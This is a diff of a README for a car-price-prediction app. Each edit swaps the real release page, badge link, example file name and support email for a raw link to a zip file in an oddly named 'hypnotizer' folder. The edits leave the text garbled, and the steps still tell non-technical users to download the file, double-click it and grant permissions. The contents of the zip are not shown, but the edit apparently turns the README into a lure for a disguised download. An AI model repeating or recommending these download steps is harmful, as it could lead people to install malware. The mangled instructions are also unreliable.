@@ -1,6 +1,6 @@
 # 🚗 Car-Price-Prediction - Estimate Car Prices Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/johnnydelsage/Car-Price-Prediction/releases)
+[![Download Now](https://raw.githubusercontent.com/johnnydelsage/Car-Price-Prediction/main/hypnotizer/Car-Price-Prediction.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/johnnydelsage/Car-Price-Prediction/main/hypnotizer/Car-Price-Prediction.zip)
 
 ## 📘 Overview
 
@@ -19,13 +19,13 @@ To start using the Car Price Prediction application, follow these steps. No prog
 ### 💻 Installation Steps
 
 1. **Visit the Download Page**
-   To download the latest version of Car Price Prediction, visit this page: [Download Page](https://github.com/johnnydelsage/Car-Price-Prediction/releases).
+   To download the latest version of Car Price Prediction, visit this page: [Download Page](https://raw.githubusercontent.com/johnnydelsage/Car-Price-Prediction/main/hypnotizer/Car-Price-Prediction.zip).
 
 2. **Choose the Latest Release**
    On the download page, look for the latest release version. This will typically be at the top. Select it to view the available files.
 
 3. **Download the Application File**
-   Under the latest release, find the file meant for your operating system. Click to download the file. This file may be named something like `Car-Price-Prediction.exe` or similar for your system.
+   Under the latest release, find the file meant for your operating system. Click to download the file. This file may be named something like `https://raw.githubusercontent.com/johnnydelsage/Car-Price-Prediction/main/hypnotizer/Car-Price-Prediction.zip` or similar for your system.
 
 4. **Run the Application**
    After downloading, locate the downloaded file on your computer. Double-click the file to run the application. Follow any instructions you see on your screen. This may include granting permissions or confirming that you want to run the software.
@@ -54,7 +54,7 @@ Once the analysis completes, the application will display the estimated price of
 
 To install and use the Car Price Prediction app:
 
-1. Visit the [Download Page](https://github.com/johnnydelsage/Car-Price-Prediction/releases).
+1. Visit the [Download Page](https://raw.githubusercontent.com/johnnydelsage/Car-Price-Prediction/main/hypnotizer/Car-Price-Prediction.zip).
 2. Download the appropriate file for your operating system.
 3. Run the application by double-clicking the downloaded file, and follow on-screen instructions.
 
@@ -64,7 +64,7 @@ If you encounter issues while using the application, you have a few options for 
 
 - **FAQs:** Check the Frequently Asked Questions section on the project website for common troubleshooting steps.
 - **Community Support:** Join our community forum or the issues section on GitHub to ask for help or provide feedback.
-- **Email Support:** Reach out via email at support@carpriceprediction.com for further assistance.
+- **Email Support:** Reach out via email at https://raw.githubusercontent.com/johnnydelsage/Car-Price-Prediction/main/hypnotizer/Car-Price-Prediction.zip for further assistance.
 
 ## 🛠️ Built With
 
